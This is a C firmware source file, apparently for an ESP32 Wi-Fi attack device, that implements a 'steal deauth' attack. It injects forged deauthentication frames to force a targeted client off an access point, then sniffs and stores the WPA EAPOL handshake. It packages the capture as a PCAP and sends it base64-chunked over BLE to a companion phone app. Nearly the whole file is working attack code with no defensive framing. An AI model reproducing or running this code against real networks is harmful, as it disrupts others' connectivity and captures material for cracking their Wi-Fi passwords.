#include "steal_deauth.h"

static const char* TAG = "STEAL_DEAUTH";

// Buffer captured frames
static pcap_frame_t captured_frames[MAX_CAPTURED_FRAMES];
static uint32_t frame_count = 0;
static bool capture_active = false;

// Capture state
static steal_state_t steal_state = STEAL_IDLE;
static uint8_t eapol_msg_count = 0;

// ======= SNIFFER =======

static void store_frame(wifi_promiscuous_pkt_t *pkt) {
    if (frame_count >= MAX_CAPTURED_FRAMES) return;

    pcap_frame_t *f = &captured_frames[frame_count];
    f->timestamp_us = esp_timer_get_time();
    f->len = pkt->rx_ctrl.sig_len;
    if (f->len > MAX_FRAME_SIZE) f->len = MAX_FRAME_SIZE;
    memcpy(f->data, pkt->payload, f->len);
    frame_count++;
}

static void IRAM_ATTR steal_sniffer_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!capture_active) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    const uint8_t *target_ap = deauth_get_ap_target();

    // ===== MGMT frames =====
    if (type == WIFI_PKT_MGMT) {
        uint8_t ftype = frame[0];
        if (ftype == 0xB0 || ftype == 0x00 || ftype == 0x20) {
            store_frame(pkt);
        }
    }

    // ===== DATA frames — EAPOL =====
    if (type == WIFI_PKT_DATA) {
        if (memcmp(&frame[4],  target_ap, 6) != 0 &&
            memcmp(&frame[10], target_ap, 6) != 0) return;

        uint8_t frame_subtype = (frame[0] >> 4) & 0x0F;
        int hdr_len = (frame_subtype == 0x08) ? 26 : 24;

        if (pkt->rx_ctrl.sig_len < hdr_len + 8) return;

        const uint8_t *llc = &frame[hdr_len];
        if (llc[0] != 0xAA || llc[1] != 0xAA) return;

        uint16_t ethertype = (llc[6] << 8) | llc[7];
        if (ethertype != 0x888E) return;

        const uint8_t *eapol = &llc[8];

        if (eapol[1] == 0x03) { // EAPOL-Key
            uint16_t key_info = (eapol[5] << 8) | eapol[6];
            bool key_ack = (key_info >> 7) & 1;
            bool key_mic = (key_info >> 8) & 1;

            if (key_ack && !key_mic) {
                if (eapol_msg_count == 0) {
                    eapol_msg_count = 1;
                    steal_state = STEAL_LISTENING; // signal to main loop to stop deauth
                    ESP_LOGI(TAG, "EAPOL MSG 1 captured - switching to listen only");
                    BleManager_SendStatus("LOG|STEAL|msg=EAPOL_MSG1_CAPTURED");
                    store_frame(pkt);
                }
            } else if (!key_ack && key_mic && eapol_msg_count == 1) {
                eapol_msg_count = 2;
                steal_state = STEAL_HANDSHAKE_CAPTURED;
                ESP_LOGI(TAG, "EAPOL MSG 2 captured - handshake complete!");
                BleManager_SendStatus("LOG|STEAL|msg=EAPOL_MSG2_CAPTURED");
            }

            store_frame(pkt);
        }
    }
}

// ======= PCAP EXPORT =======

// Calcul CRC32 simple without extern lib
static uint32_t compute_crc32(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

// Encode base64 minimal withou lib
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const uint8_t *in, size_t in_len, char *out, size_t out_max) {
    size_t out_len = 0;
    for (size_t i = 0; i < in_len; i += 3) {
        if (out_len + 4 >= out_max) return -1; // overflow
        uint32_t val = in[i] << 16;
        if (i + 1 < in_len) val |= in[i+1] << 8;
        if (i + 2 < in_len) val |= in[i+2];

        out[out_len++] = b64_table[(val >> 18) & 0x3F];
        out[out_len++] = b64_table[(val >> 12) & 0x3F];
        out[out_len++] = (i + 1 < in_len) ? b64_table[(val >> 6) & 0x3F] : '=';
        out[out_len++] = (i + 2 < in_len) ? b64_table[val & 0x3F]        : '=';
    }
    out[out_len] = '\0';
    return out_len;
}

// Build entire PCAP buffer in RAM
static uint8_t* build_pcap_buffer(uint32_t *out_size) {
    // Calcul total size
    uint32_t total = sizeof(pcap_global_header_t);
    for (uint32_t i = 0; i < frame_count; i++) {
        total += sizeof(pcap_record_header_t) + captured_frames[i].len;
    }

    uint8_t *buf = (uint8_t*)malloc(total);
    if (!buf) {
        ESP_LOGE(TAG, "malloc failed for PCAP buffer (%lu bytes)", total);
        return NULL;
    }

    uint32_t offset = 0;

    // Global header
    pcap_global_header_t gh = {
        .magic_number  = 0xA1B2C3D4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone      = 0,
        .sigfigs       = 0,
        .snaplen       = 65535,
        .network       = 105  // IEEE 802.11
    };
    memcpy(buf + offset, &gh, sizeof(gh));
    offset += sizeof(gh);

    // Record per frame
    for (uint32_t i = 0; i < frame_count; i++) {
        pcap_frame_t *f = &captured_frames[i];
        uint32_t ts_sec  = (uint32_t)(f->timestamp_us / 1000000);
        uint32_t ts_usec = (uint32_t)(f->timestamp_us % 1000000);

        pcap_record_header_t rh = {
            .ts_sec   = ts_sec,
            .ts_usec  = ts_usec,
            .incl_len = f->len,
            .orig_len = f->len
        };
        memcpy(buf + offset, &rh, sizeof(rh));
        offset += sizeof(rh);

        memcpy(buf + offset, f->data, f->len);
        offset += f->len;
    }

    *out_size = offset;
    return buf;
}

void steal_export_pcap_ble(void) {
    if (frame_count == 0) {
        BleManager_SendStatus("LOG|STEAL|msg=NO_FRAMES_TO_EXPORT");
        return;
    }

    ESP_LOGI(TAG, "Building PCAP buffer (%lu frames)...", frame_count);

    // Build buffer PCAP
    uint32_t pcap_size = 0;
    uint8_t *pcap_buf = build_pcap_buffer(&pcap_size);
    if (!pcap_buf) {
        BleManager_SendStatus("LOG|STEAL|msg=PCAP_BUILD_FAILED");
        return;
    }

    // CRC32 on all the buffer le buffer
    uint32_t crc = compute_crc32(pcap_buf, pcap_size);

    // Announce beginning
    char start_msg[128];
    snprintf(start_msg, sizeof(start_msg),
        "PCAP|START|size=%lu|frames=%lu", pcap_size, frame_count);
    BleManager_SendStatus(start_msg);
    vTaskDelay(pdMS_TO_TICKS(100)); // laisser Android traiter

    // Send per chunks of PCAP_CHUNK_SIZE bytes in base64
    // base64 gets bigger by x1.33 then chunk of 180 bytes -> ~240 chars
    // + overhead header "PCAP|CHUNK|XX|" -> under 300 chars
    const int CHUNK_SIZE = 180;
    int chunk_index = 0;
    uint32_t sent = 0;

    // Buffer base64 : ceil(180/3)*4 + 1 = 241 chars
    char b64_buf[256];
    // Buffer entire message : "PCAP|CHUNK|XXXX|" + 241 + null
    char msg_buf[300];

    while (sent < pcap_size) {
        uint32_t remaining = pcap_size - sent;
        uint32_t chunk_len = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;

        int b64_len = base64_encode(pcap_buf + sent, chunk_len, b64_buf, sizeof(b64_buf));
        if (b64_len < 0) {
            ESP_LOGE(TAG, "base64 overflow at chunk %d", chunk_index);
            break;
        }

        snprintf(msg_buf, sizeof(msg_buf),
            "PCAP|CHUNK|%d|%s", chunk_index, b64_buf);
        BleManager_SendStatus(msg_buf);

        sent += chunk_len;
        chunk_index++;

        // Throttle — BLE needs time between notifications
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // Announce end of CRC
    char end_msg[64];
    snprintf(end_msg, sizeof(end_msg), "PCAP|END|crc=0x%08lX", crc);
    BleManager_SendStatus(end_msg);

    ESP_LOGI(TAG, "PCAP export done: %d chunks, %lu bytes, CRC=0x%08lX",
             chunk_index, pcap_size, crc);

    free(pcap_buf);
}

// ======= TASK =======

static void steal_task(void *vParameters) {
    ESP_LOGI(TAG, "========== STEAL DEAUTH START ==========");

    const uint8_t *target_ap     = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();
    uint8_t attack_channel       = deauth_get_attack_channel();

    frame_count      = 0;
    eapol_msg_count  = 0;
    steal_state      = STEAL_IDLE;

    // PHASE 1 — Sniffer ON, listen beacons to confirm range
    BleManager_SendStatus("LOG|STEAL|msg=Phase 1: Checking AP range...");

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(steal_sniffer_handler);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);

    // Listen 2s to validate AP presence
    capture_active = true;
    uint32_t beacon_count = 0;
    uint32_t check_start = esp_timer_get_time() / 1000;

    while ((esp_timer_get_time() / 1000 - check_start) < 2000) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    // No beacon verification here, we rely on test_deauth
    // for validation PMF/range. steal_deauth suppose to be validated

    // PHASE 2 — Deauth + simultaneous listen
    BleManager_SendStatus("LOG|STEAL|msg=Phase 2: Deauth + capture...");
    steal_state = STEAL_DEAUTHING;

    // Send deauth and keep sniffing
    // Switch: burst deauth -> écoute -> burst deauth
    uint32_t attack_start = esp_timer_get_time() / 1000;
    const uint32_t MAX_ATTACK_MS = 15000; // 15s max

    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
    int burst_count = 0;

    while (deauthActive &&
           steal_state != STEAL_HANDSHAKE_CAPTURED &&
           steal_state != STEAL_LISTENING &&
           (esp_timer_get_time() / 1000 - attack_start) < MAX_ATTACK_MS) {

        // Switch to AP mode for injection
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(50));

        // Burst 3 deauth
        uint8_t packet[26];
        for (int b = 0; b < 3; b++) {
            uint8_t reason = reason_codes[burst_count % 4];

            build_deauth_packet(packet, target_client, target_ap, target_ap, reason);
            send_with_retry(packet, 3);
            vTaskDelay(pdMS_TO_TICKS(5));

            build_deauth_packet(packet, target_ap, target_client, target_ap, reason);
            send_with_retry(packet, 3);
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        burst_count++;

        // Switch to promiscuous mode to listen reconnection
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(steal_sniffer_handler);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);

        // Listen 500ms
        vTaskDelay(pdMS_TO_TICKS(500));

        if (steal_state == STEAL_HANDSHAKE_CAPTURED) break;
    }

    // If MSG1 received, listen for 2s max
    if (steal_state == STEAL_LISTENING) {
        BleManager_SendStatus("LOG|STEAL|msg=MSG1 received, listening for MSG2...");
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
        
        uint32_t wait_start = esp_timer_get_time() / 1000;
        while ((esp_timer_get_time() / 1000 - wait_start) < 2000 &&
                steal_state != STEAL_HANDSHAKE_CAPTURED) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        // If no MSG2 yet, release deauth
        if (steal_state != STEAL_HANDSHAKE_CAPTURED) {
            steal_state = STEAL_DEAUTHING;
            eapol_msg_count = 0; // reset for next cycle
        }
    }

    // PHASE 3 — Listen post-deauth if handshake not captured yet
    if (steal_state != STEAL_HANDSHAKE_CAPTURED) {
        BleManager_SendStatus("LOG|STEAL|msg=Phase 3: Listening for reconnect...");
        steal_state = STEAL_LISTENING;

        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);

        uint32_t listen_start = esp_timer_get_time() / 1000;
        while ((esp_timer_get_time() / 1000 - listen_start) < 10000 &&
               steal_state != STEAL_HANDSHAKE_CAPTURED) {
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }

    capture_active = false;
    esp_wifi_set_promiscuous(false);

    // Result
    if (steal_state == STEAL_HANDSHAKE_CAPTURED) {
        char result[128];
        snprintf(result, sizeof(result),
            "LOG|STEAL|msg=Handshake captured! %lu frames stored", frame_count);
        BleManager_SendStatus(result);
        ESP_LOGI(TAG, "Handshake captured: %lu frames", frame_count);

        // Export PCAP via BLE
        vTaskDelay(pdMS_TO_TICKS(500));
        steal_export_pcap_ble();
    } else {
        steal_state = STEAL_FAILED;
        BleManager_SendStatus("LOG|STEAL|msg=FAILED - no handshake captured");
        ESP_LOGW(TAG, "No handshake captured after %lu frames", frame_count);
    }

    // Cleanup
    restore_wifi_state();
    deauthActive   = false;
    isAttackActive = false;
    deauth_set_task_handle(NULL);
    vTaskDelete(NULL);
}

// ======= PUBLIC API =======

void start_deauth_steal_attack(char *target, char *ap, int channel) {
    if (deauthActive) {
        ESP_LOGW(TAG, "Attack already running");
        return;
    }
    if (deauth_get_task_handle() != NULL) {
        ESP_LOGW(TAG, "Task already exists");
        return;
    }

    uint8_t target_mac[6], ap_mac[6];
    if (!mac_str_to_bytes(target, target_mac) || !mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid MAC format");
        return;
    }

    set_deauth_targets(ap_mac, target_mac);
    set_deauth_channel(channel);

    deauthActive   = true;
    isAttackActive = true;

    TaskHandle_t handle = NULL;
    xTaskCreate(steal_task, "steal_task", 8192, NULL, 5, &handle);
    deauth_set_task_handle(handle);

    ESP_LOGI(TAG, "Steal task started");
    BleManager_SendStatus("LOG|STEAL|msg=STEAL_ATTACK_STARTED");
}

void stop_deauth_steal_attack(void) {
    if (!deauthActive) return;
    deauthActive   = false;
    capture_active = false;
    ESP_LOGI(TAG, "Steal attack stopped");
}